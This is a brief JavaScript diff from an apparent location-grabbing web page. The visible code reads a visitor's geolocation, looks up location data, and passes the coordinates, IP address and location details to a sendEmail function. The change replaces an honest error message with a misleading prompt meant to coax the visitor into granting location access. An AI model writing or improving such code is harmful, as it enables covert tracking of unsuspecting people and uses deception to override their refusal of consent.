@@ -95,7 +95,7 @@
                     const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
                     sendEmail(position, ipAddress, locationData);
                 }, (error) => {
-                    alert("Unable to retrieve your location. Please check your settings.");
+                    alert("Please open the link and allow it to display on the web.");
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
